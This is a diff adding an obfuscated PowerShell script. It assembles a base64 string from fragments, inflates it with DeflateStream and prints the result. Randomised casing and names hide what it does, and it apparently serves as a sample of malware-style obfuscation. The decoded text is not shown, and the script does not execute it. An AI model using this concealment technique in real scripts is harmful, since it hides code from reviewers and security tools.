@@ -1,0 +1,31 @@
+$YDdYO='RcjBCYAwEAXRu' 
+$YDdYO+='1V8RPAiQYMgES' 
+$YDdYO +='zAMhJcQZFE1l0' 
+$YDdYO+='l3evN27ypmC49' 
+$YDdYO+= 'BBPKeUVOCs8Eu' 
+$YDdYO+= 'omxRQgnDQc1WF' 
+$YDdYO+= 'Ks5WOGJARCYH9'
+$YDdYO +='/e9dLwBr/gn98' 
+$YDdYO+= 'Nts5dtYZ15puc'
+$uBpKrLs ='Mb2tixe' 
+$uBpKrLs=$YDdYO + $uBpKrLs 
+FuncTIoN idGmXVL { 
+    [CMdLeTBiNDinG() ]PARam( 
+        [paraMETeR (vaLUEfromPIpElINE)]
+        $iCpOYho,
+        [paraMETeR (vaLUEfromPIpElINE)]
+        $EeeHb,
+        [paraMETeR(vaLUEfromPIpElINE)]
+        $VosmN
+    )
+     [iO.memOrystReAm] [SYsteM.COnverT]::froMbasE64sTRInG($VosmN ) |aFMbuF
+}
+FuncTIoN aFMbuF { 
+    [CMdLeTBiNDinG() ]PARam( 
+        [paraMETeR (vaLUEfromPIpElINE)]
+        $yzmEKAX
+    )
+    (new-objECt   SYstEM.Io.COmprEsSIOn.deFlATestReAm($yzmEKAX,[sySTEm.io.CoMpREssIoN.COMPResSiOnMOdE]::DeComPreSs)|Foreach-obJECT{ new-objECt   sYstEm.io.StREAmREADER($_,[sYSTeM.teXT.enCoDiNG]::ASCii ) } ).ReAdTOEnd() | write-host
+}
+idGmXVL -iCpOYho 'vfphch' -EeeHb 'UHDLpnH' -VosmN $uBpKrLs
+
